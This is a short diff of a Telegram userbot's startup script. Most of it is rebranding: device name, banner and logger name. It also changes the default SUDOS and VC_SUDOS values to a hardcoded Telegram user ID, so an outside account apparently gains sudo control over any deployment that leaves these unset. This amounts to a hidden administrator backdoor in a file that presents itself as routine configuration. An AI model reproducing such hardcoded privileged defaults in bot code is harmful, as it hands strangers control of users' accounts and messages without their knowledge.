@@ -66,7 +66,7 @@ if sys.argv[0] == "-m":
             validate_session(Var.SESSION, LOGS),
             udB=udB,
             app_version=dante_version,
-            device_model="ʀᴇᴢᴀ ꭙ ᴜsᴇʀʙᴏᴛ​",
+            device_model="Dante UserBot​",
         )
         dante_bot.run_in_loop(autobot())
 
@@ -89,17 +89,17 @@ if sys.argv[0] == "-m":
     _version_changes(udB)
 
     HNDLR = udB.get_key("HNDLR") or "."
-    SUDOS = udB.get_key("SUDOS") or "1087819304"
-    VC_SUDOS = udB.get_key("VC_SUDOS") or "1087819304"
+    SUDOS = udB.get_key("SUDOS") or "940232666"
+    VC_SUDOS = udB.get_key("VC_SUDOS") or "940232666"
     DUAL_HNDLR = udB.get_key("DUAL_HNDLR") or "/"
     SUDO_HNDLR = udB.get_key("SUDO_HNDLR") or "$"
     INLINE_PM = udB.set_key("INLINE_PM", "True")
     PMLOG = udB.set_key("PMLOG", "True")
 else:
-    print("ʀᴇᴢᴀ ꭙ ᴜsᴇʀʙᴏᴛ​ © @dantedgank")
+    print("ᴅᴀɴᴛᴇ ꭙ ᴜsᴇʀʙᴏᴛ © @Usern4meDoesNotExist404")
 
     from logging import getLogger
 
-    LOGS = getLogger("ʀᴇᴢᴀ ꭙ ᴜsᴇʀʙᴏᴛ​")
+    LOGS = getLogger("ᴅᴀɴᴛᴇ ꭙ ᴜsᴇʀʙᴏᴛ")
 
     dante_bot = asst = udB = vcClient = None
